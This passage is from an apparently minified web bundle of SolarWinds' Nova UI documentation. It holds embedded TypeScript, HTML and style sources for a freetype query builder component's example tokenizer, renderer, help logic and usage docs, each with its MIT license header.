[ExampleAppTokenType.SELECT_KEYWORD].toString():\n                {\n                    const idx = this.tokens.findIndex(\n                        (token: ExampleAppToken) =>\n                            token.type === ExampleAppTokenType.SELECT_KEYWORD\n                    );\n                    this.tokens[idx].issue = "error";\n                    this.tokens[idx].issueMessage =\n                        "You need to specify fields to select";\n                }\n                break;\n            case [\n                ExampleAppTokenType.SELECT_KEYWORD,\n                ExampleAppTokenType.STRING,\n                ExampleAppTokenType.FROM_KEYWORD,\n            ].toString():\n                {\n                    const idx = this.tokens.findIndex(\n                        (token: ExampleAppToken) =>\n                            token.type === ExampleAppTokenType.FROM_KEYWORD\n                    );\n                    this.tokens[idx].issue = "error";\n                    this.tokens[idx].issueMessage =\n                        "You need to specify table to select from";\n                }\n                break;\n        }\n    }\n}\n'},78807:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { QueryToken } from "@nova-ui/bits";\n\nexport interface ExampleAppToken extends QueryToken {\n    issue?: any;\n    issueMessage?: string;\n    type: ExampleAppTokenType;\n}\n\nexport enum ExampleAppTokenType {\n    SELECT_KEYWORD = "SELECT_KEYWORD",\n    FROM_KEYWORD = "FROM_KEYWORD",\n    STRING = "STRING",\n    UNDEFINED = "UNDEFINED",\n}\n\nexport enum HighlightColor {\n    COL_1 = "#a6dbf8",\n    COL_2 = "rgba(0, 196, 210, 0.5)",\n    COL_3 = "#ffa6df",\n    COL_4 = "#e3e3e3",\n}\n\nexport enum NotifColor {\n    error = "red",\n    info = "lightblue",\n    warning = "#ffe11d",\n}\n'},7602:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { RenderConfigurator } from "@nova-ui/bits";\n\nimport {\n    ExampleAppToken,\n    ExampleAppTokenType,\n    HighlightColor,\n    NotifColor,\n} from "./models";\n\nexport class ExampleAppRenderer implements RenderConfigurator<ExampleAppToken> {\n    getHighlightColor(token: ExampleAppToken): string {\n        switch (token.type) {\n            case ExampleAppTokenType.SELECT_KEYWORD:\n                return HighlightColor.COL_1;\n            case ExampleAppTokenType.FROM_KEYWORD:\n                return HighlightColor.COL_2;\n            case ExampleAppTokenType.STRING:\n                return HighlightColor.COL_3;\n            case ExampleAppTokenType.UNDEFINED:\n                return HighlightColor.COL_3;\n            default:\n                return HighlightColor.COL_3;\n        }\n    }\n\n    getNotifColor(token: ExampleAppToken): string {\n        return NotifColor[token.issue as keyof typeof NotifColor];\n    }\n\n    enhanceTokens(tokens: ExampleAppToken[]): ExampleAppToken[] {\n        return tokens;\n    }\n}\n'},26636:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiFreeTypeQueryBuilderModule</code>\n    </li>\n</ul>\n\n<p>\n    Freetype Query Builder is a generic component designed as a base for\n    creating query input to allow the user to type a query in a defined query\n    language.\n</p>\n\n<p><code>nui-freetype-query-builder</code> provides:</p>\n<ul>\n    <li>the input</li>\n    <li>highlighting functionality</li>\n    <li>options mechanics</li>\n    <li>auto multiline resizing</li>\n</ul>\n\n<nui-message type="warning" [allowDismiss]="false">\n    <code>nui-freetype-query-builder</code> doesn\'t provide the grammar. It\n    should be provided by the consumer.\n</nui-message>\n\n<h2>Basic Usage</h2>\n\n<p>To use <code>nui-freetype-query-builder</code> do the following:</p>\n\n<ol>\n    <li>\n        Add <code>&lt;nui-freetype-query-builder&gt;</code> to your template.\n    </li>\n    <li>\n        Create a tokenizer object that implements the\n        <code>\n            <a href="../interfaces/Tokenizer.html" target="_blank">Tokenizer</a>\n        </code>\n        interface and pass it to the tokenizer input of the query-builder\n        component. The tokenizeText method is a place, where you can implement\n        your custom logic to tokenize the user input. It takes a query string as\n        input and should return an array of Token objects which should extend\n        QueryToken interface.\n        <nui-example-code language="typescript">{{\n            tokenizerExample\n        }}</nui-example-code>\n    </li>\n    <li>\n        Create a renderer object that implements the\n        <code>\n            <a href="../interfaces/RenderConfigurator.html" target="_blank"\n                >RenderConfigurator</a\n            >\n        </code>\n        interface and pass it to the renderer input of the query-builder\n        component.\n        <ul>\n            <li>\n                <code>getNotifColor</code> - method takes a Token object as\n                input and returns the border color of the token.\n            </li>\n            <li>\n                <code>getHighlightColor</code> - method takes a Token object as\n                input and returns the color of the token.\n            </li>\n            <li>\n                <code>enhanceTokens</code> - optional method takes an array of\n                Token objects as an input and returns the array of tokens which\n                should be focused.\n            </li>\n        </ul>\n        <nui-example-code language="typescript">{{\n            rendererExample\n        }}</nui-example-code>\n    </li>\n    <li>\n        Optionally you can create a help entry array of type\n        <code>HelpEntry[]</code> and pass it to the currentHelp input of the\n        query-builder component. Depends purely on implementation, how the array\n        is build, but as the component notifies about cursor position can be\n        generated based on the focused token.\n    </li>\n</ol>\n\n<nui-example-wrapper\n    filenamePrefix="freetype-query-builder-basic"\n    exampleTitle="Freetype Query Builder Basic Usage"\n>\n    <nui-freetype-query-builder-basic-example></nui-freetype-query-builder-basic-example>\n</nui-example-wrapper>\n\n<h2>Inputs</h2>\n<ul>\n    <li><code>value</code> - Input value of type string.</li>\n    <li>\n        <code>maxLength</code> - Set the maximum allowed value for the input\n        field. Defaults to <code>10 000</code>.\n    </li>\n    <li>\n        <code>placeholder</code> - Set the string to use as a placeholder for\n        the input field. Default is <code>""</code>.\n    </li>\n    <li>\n        <code>readonly</code> - Set the freetype query builder to readonly\n        state. Defaults to <code>false</code>.\n    </li>\n    <li>\n        <code>renderer</code> - The renderer is responsible for marking which\n        tokens should be colored and deciding type of coloring (background,\n        border).\n    </li>\n    <li>\n        <code>tokenizer</code> - The tokenizer is responsible for parsing user\n        input to array of tokens.\n    </li>\n    <li>\n        <code>currentHelp</code> - Array of options for user to select. Depends\n        purely on implementation how they are build, but as component notifies\n        about cursor position can be generated based on focused token.\n    </li>\n    <li>\n        <code>cursorSetter$</code> - Way to set cursor to specific position.\n    </li>\n</ul>\n\n<h2>Outputs</h2>\n<ul>\n    <li>\n        <code>helpItemSelected</code> - Emits when user selects option from\n        displayed help list.\n    </li>\n    <li><code>currentValue</code> - Emits when value changed in the input.</li>\n    <li><code>cursorPos</code> - Emits on any cursor position change.</li>\n    <li>\n        <code>submitQuery</code> - Emits when "Enter" is hit with closed\n        options.\n    </li>\n</ul>\n'},70924:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host {\n    ul {\n        padding-left: 40px;\n\n        li {\n            list-style: disc;\n        }\n    }\n}\n"},49468:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-freetype-query-builder-docs-example",\n    templateUrl: "freetype-query-builder-docs.example.component.html",\n    styleUrls: ["freetype-query-builder-docs.example.component.less"],\n})\nexport class FreetypeQueryBuilderDocsExampleComponent {\n    tokenizerExample =\n        "export class ExampleTokenizer implements Tokenizer<ExampleToken> {\\n" +\n        "  tokenizeText(query: string): ExampleToken[];\\n" +\n        "    // Implement your logic to tokenize the query string\\n" +\n        "    // Here\'s a simple example that splits the query by spaces\\n" +\n        "    const tokens = query.split(\' \').map((value) => new ExampleToken(value.trim()));\\n" +\n        "\\n" +\n        "    return tokens;\\n" +\n        "}";\n\n    rendererExample =\n        "class ExampleRenderConfigurator implements RenderConfigurator<ExampleToken> {\\n" +\n        "  getNotifColor(token: ExampleToken): string {\\n" +\n        "    // Implement your logic to determine the border color of the token\\n" +\n        "    // Return the color as a string\\n" +\n        "    return token.type === ExampleTokenType.TYPE1 ? \'red\' : \'black\';\\n" +\n        "  }\\n" +\n        "\\n" +\n        "  getHighlightColor(token: ExampleToken): string {\\n" +\n        "    // Implement your logic to determine the color of the token\\n" +\n        "    // Return the color as a string\\n" +\n        "    return token.type === ExampleTokenType.TYPE1 ? \'yellow\' : \'white\';\\n" +\n        "  }\\n" +\n        "\\n" +\n        "  enhanceTokens(tokens: ExampleToken[]): ExampleToken[] {\\n" +\n        "    // Implement your logic to enhance the tokens, if needed\\n" +\n        "    // Return the updated array of tokens\\n" +\n        "    return tokens;\\n" +\n        "  }\\n" +\n        "}";\n}\n'},22535:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { HelpEntry } from "@nova-ui/bits";\n\nimport { ExampleAppToken, ExampleAppTokenType } from "./models";\n\n/**\n * This is example of how can be help updated based on selected token also shows how notifications can be shown.\n *\n * This is NOT required approach.\n *\n * FreeTypeQueryBuilder does not enforce specific approach.\n *\n * This specific example is updating help based on focused token type.\n */\nexport class ExampleHelp {\n    getCurrentHelp(idx: number, tokens: ExampleAppToken[]): HelpEntry[] {\n        const currentHelp = [];\n        if (idx >= 0 && tokens[idx].issue) {\n            currentHelp.push({\n                items: [\n                    {\n                        message: {\n                            displayValue: tokens[idx].issueMessage,\n                        },\n                        severity: tokens[idx].issue,\n                    },\n                ],\n                notice: true,\n            });\n        }\n        if (idx >= 0) {\n            switch (tokens[idx].type) {\n                case ExampleAppTokenType.NUMBER:\n                    currentHelp.push(\n                        { displayValue: "111", value: "111" },\n                        { displayValue: "123", value: "123" },\n                        { displayValue: "222", value: "222" }\n                    );\n                    break;\n                case ExampleAppTokenType.STRING:\n                    currentHelp.push(\n                        { displayValue: "aaa1", value: "aaa1" },\n                        { displayValue: "ab1c", value: "ab1c" },\n                        { displayValue: "1bbb", value: "1bbb" }\n                    );\n                    break;\n                case ExampleAppTokenType.STRING_WITHOUT_NUMBER:\n                    currentHelp.push(\n                        { displayValue: "aaa", value: "aaa" },\n                        { displayValue: "abc", value: "abc" },\n                        { displayValue: "bbb", value: "bbb" }\n                    );\n                    break;\n                default:\n            }\n        }\n\n        return currentHelp;\n    }\n}\n'},70951:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ExampleAppToken, ExampleAppTokenType } from "./models";\n\nexport class ExampleTokenizer {\n    tokenizeText(text: string, baseIdx?: number): ExampleAppToken[] {\n        if (!text) {\n            return [];\n        }\n        const SEPARATOR = " ";\n        const simpleGetFirstTokenFromIndex = (\n            value: string,\n            index: number\n        ): ExampleAppToken => {\n            const nextSeparatorIdx = value.substr(index).indexOf(SEPARATOR);\n            let token: ExampleAppToken;\n            if (nextSeparatorIdx >= 0) {\n                token = {\n                    value: value.substr(index, nextSeparatorIdx),\n                    type: ExampleAppTokenType.NUMBER,\n                    start: index,\n                    end: index + nextSeparatorIdx - 1,\n                };\n            } else {\n                token = {\n                    value: value.substr(index),\n                    type: ExampleAppTokenType.NUMBER,\n                    start: index,\n                    end: value.length - 1,\n                };\n            }\n            if (/^\\d+$/.test(token.value)) {\n                token.type = ExampleAppTokenType.NUMBER;\n            } else if (/[\\d]+/.test(token.value)) {\n                token.type = ExampleAppTokenType.STRING;\n            } else {\n                token.type = ExampleAppTokenType.STRING_WITHOUT_NUMBER;\n            }\n\n            const length = token.value.length;\n            const type =\n                length > 5\n                    ? "error"\n                    : length > 4\n                    ? "warning"\n                    : length > 3\n                    ? "info"\n                    : undefined;\n            if (type) {\n                token.issue = type;\n                token.issueMessage = "error message";\n            }\n\n            return token;\n        };\n\n        let lastEndIdx = 0;\n        let nextEndIdx = 0;\n        const tokens = [];\n        if (baseIdx) {\n            nextEndIdx = baseIdx;\n        }\n\n        do {\n            const token = simpleGetFirstTokenFromIndex(text, nextEndIdx);\n            tokens.push(token);\n            lastEndIdx = token.end;\n            nextEndIdx = token.end + 2;\n        } while (lastEndIdx < text.length - 1 && nextEndIdx < text.length);\n\n        return tokens;\n    }\n}\n'},85624:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-freetype-query-builder\n    id="example1"\n    [value]="value"\n    (currentValue)="onValueChange($event)"\n    (cursorPos)="onCursorPosChange($event)"\n    [currentHelp]="currentHelp"\n    [tokenizer]="tokenizer"\n    [renderer]="renderer"\n    (submitQuery)="onSubmit()"\n    [placeholder]="placeholder"\n    (helpItemSelected)="updateTextAfterHelpSelection($event)"\n    [cursorSetter$]="cursorSetter$$"\n    [readonly]="readonly"\n>\n</nui-freetype-query-builder>\n'},43272:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport {\n    ChangeDetectorRef,\n    Component,\n    EventEmitter,\n    Input,\n    Output,\n} from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport { HelpEntry, Tokenizer } from "@nova-ui/bits";\n\nimport { ExampleHelp } from "./example-help";\nimport { ExampleTokenizer } from "./example-tokenizer";\nimport { ExampleAppToken } from "./models";\nimport { ExampleAppRenderer } from "./renderer";\n\n@Component({\n    selector: "nui-freetype-query-builder-visual-test",\n    templateUrl: "freetype-query-builder-test.component.html",\n})\nexport class FreetypeQueryBuilderTestComponent {\n    @Input() exampleId: string;\n    /**\n     * Inputs and outputs here are example of how the api for such a component can look. But This is going to be very specific based on required use-cases.\n     */\n    @Input()\n    readonly: boolean = false;\n    @Input()\n    placeholder: string = "default placeholder";\n    @Input()\n    value: string = "";\n    @Input()\n    draggingInProgress = false;\n    @Output()\n    focusedTokenChange = new EventEmitter();\n    @Output()\n    tokensChange = new EventEmitter();\n    @Output()\n    cursorPosChange = new EventEmitter();\n    @Output() valueChange = new EventEmitter<string>();\n    @Output() submitQuery = new EventEmitter();\n\n    tokens: ExampleAppToken[] = [];\n    cursorSetter$$ = new Subject();\n    currentCursorPos = -1;\n\n    renderer = new ExampleAppRenderer();\n    currentHelp: HelpEntry[] = [];\n    tokenizer: Tokenizer<ExampleAppToken> = new ExampleTokenizer();\n    helpUpdater: ExampleHelp = new ExampleHelp();\n\n    constructor(private cd: ChangeDetectorRef) {}\n\n    onValueChange($event: { value: string; tokens: ExampleAppToken[] }): void {\n        this.tokens = $event.tokens;\n        if (this.value !== $event.value) {\n            this.value = $event.value;\n        }\n        this.updateHelp();\n    }\n\n    onCursorPosChange($event: number): void {\n        if (this.currentCursorPos !== $event) {\n            this.currentCursorPos = $event;\n            this.updateHelp();\n            this.cd.detectChanges();\n        }\n    }\n\n    onSubmit(): void {}\n\n    /**\n     * This is example of how can be handled selection value in help. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce replacing any value\n     * in the input. It offers full flexibility on consumer side to decide what action is going to happen when option is chosen.\n     *\n     * This specific example will replace value of current token with value from option selected.\n     * @param $event\n     */\n    updateTextAfterHelpSelection($event: { value: string }): void {\n        const idx = this.getFocusedTokenIndex();\n        const nextCurPos = this.tokens[idx].start + $event.value.length;\n        this.value =\n            this.value.substring(0, this.tokens[idx].start) +\n            $event.value +\n            this.value.substring(this.tokens[idx].end + 1);\n        this.cursorSetter$$.next(nextCurPos);\n    }\n\n    /**\n     * This is example of how can be help updated based on selected token. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce specific approach.\n     *\n     * This specific example is updating help based on focused token type.\n     */\n    updateHelp(): void {\n        const idx = this.getFocusedTokenIndex();\n        this.currentHelp = this.helpUpdater.getCurrentHelp(idx, this.tokens);\n    }\n\n    getFocusedTokenIndex(): number {\n        for (let i = 0; i < this.tokens.length; i++) {\n            if (\n                this.tokens[i].start <= this.currentCursorPos &&\n                this.tokens[i].end + 1 >= this.currentCursorPos\n            ) {\n                return i;\n            }\n        }\n\n        return -1;\n    }\n}\n'},44195:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { QueryToken } from "@nova-ui/bits";\n\nexport interface ExampleAppToken extends QueryToken {\n    issue?: any;\n    issueMessage?: string;\n    type: ExampleAppTokenType;\n}\n\nexport enum ExampleAppTokenType {\n    NUMBER = "NUMBER",\n    STRING = "STRING",\n    STRING_WITHOUT_NUMBER = "STRING_WITHOUT_NUMBER",\n}\n\nexport enum HighlightColor {\n    COL_1 = "#a6dbf8",\n    COL_2 = "rgba(0, 196, 210, 0.5)",\n    COL_3 = "#ffa6df",\n    COL_4 = "#e3e3e3",\n}\n\nexport enum NotifColor {\n    error = "red",\n    info = "lightblue",\n    warning = "#ffe11d",\n}\n'},72846:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { RenderConfigurator } from "@nova-ui/bits";\n\nimport {\n    ExampleAppToken,\n    ExampleAppTokenType,\n    HighlightColor,\n    NotifColor,\n} from "./models";\n\nexport class ExampleAppRenderer implements RenderConfigurator<ExampleAppToken> {\n    getHighlightColor(token: ExampleAppToken): HighlightColor {\n        switch (token.type) {\n            case ExampleAppTokenType.NUMBER:\n                return HighlightColor.COL_3;\n            case ExampleAppTokenType.STRING:\n                return HighlightColor.COL_1;\n            default:\n                return HighlightColor.COL_2;\n        }\n    }\n\n    getNotifColor(token: ExampleAppToken): string {\n        return NotifColor[token.issue as keyof typeof NotifColor];\n    }\n\n    enhanceTokens(tokens: ExampleAppToken[]): ExampleAppToken[] {\n        return tokens;\n    }\n}\n'},30215:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-freetype-query-builder\n    [id]="exampleId"\n    [value]="value"\n    (currentValue)="onValueChange($event)"\n    (cursorPos)="onCursorPosChange($event)"\n    [currentHelp]="currentHelp"\n    [tokenizer]="tokenizer"\n    [renderer]="renderer"\n    (submitQuery)="onSubmit()"\n    [placeholder]="placeholder"\n    (helpItemSelected)="updateTextAfterHelpSelection($event)"\n    [cursorSetter$]="cursorSetter$$"\n    [readonly]="readonly"\n>\n</nui-freetype-query-builder>\n'},69023:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2023 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.s\n\nimport {\n    ChangeDetectorRef,\n    Component,\n    EventEmitter,\n    Input,\n    Output,\n} from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport { HelpEntry, Tokenizer } from "@nova-ui/bits";\n\nimport { ExampleHelp } from "../freetype-query-builder-test/example-help";\nimport { ExampleTokenizer } from "../freetype-query-builder-test/example-tokenizer";\nimport { ExampleAppToken } from "../freetype-query-builder-test/models";\nimport { ExampleAppRenderer } from "../freetype-query-builder-test/renderer";\n\n@Component({\n    selector: "example-freetype-query-builder",\n    templateUrl: "./example-freetype-query-builder.component.html",\n})\nexport class ExampleFreetypeQueryBuilderComponent {\n    @Input() exampleId: string;\n    /**\n     * Inputs and outputs here are example of how the api for such a component can look. But This is going to be very specific based on required use-cases.\n     */\n    @Input()\n    readonly: boolean = false;\n    @Input()\n    placeholder: string = "default placeholder";\n    @Input()\n    value: string = "";\n    @Input()\n    draggingInProgress = false;\n    @Output()\n    focusedTokenChange = new EventEmitter();\n    @Output()\n    tokensChange = new EventEmitter();\n    @Output()\n    cursorPosChange = new EventEmitter();\n    @Output() valueChange = new EventEmitter<string>();\n    @Output() submitQuery = new EventEmitter();\n\n    tokens: ExampleAppToken[] = [];\n    cursorSetter$$ = new Subject();\n    currentCursorPos = -1;\n\n    renderer = new ExampleAppRenderer();\n    currentHelp: HelpEntry[] = [];\n    tokenizer: Tokenizer<ExampleAppToken> = new ExampleTokenizer();\n    helpUpdater: ExampleHelp = new ExampleHelp();\n\n    constructor(private cd: ChangeDetectorRef) {}\n\n    onValueChange($event: { value: string; tokens: ExampleAppToken[] }): void {\n        this.tokens = $event.tokens;\n        if (this.value !== $event.value) {\n            this.value = $event.value;\n        }\n        this.updateHelp();\n    }\n\n    onCursorPosChange($event: number): void {\n        if (this.currentCursorPos !== $event) {\n            this.currentCursorPos = $event;\n            this.updateHelp();\n            this.cd.detectChanges();\n        }\n    }\n\n    onSubmit(): void {}\n\n    /**\n     * This is example of how can be handled selection value in help. This is NOT required approach.\n     *\n     * FreeTypeQueryBuilder does not enforce replacing any value\n     * in the input. It offers full flexibility on consumer side to decide what action is going to happen when option is 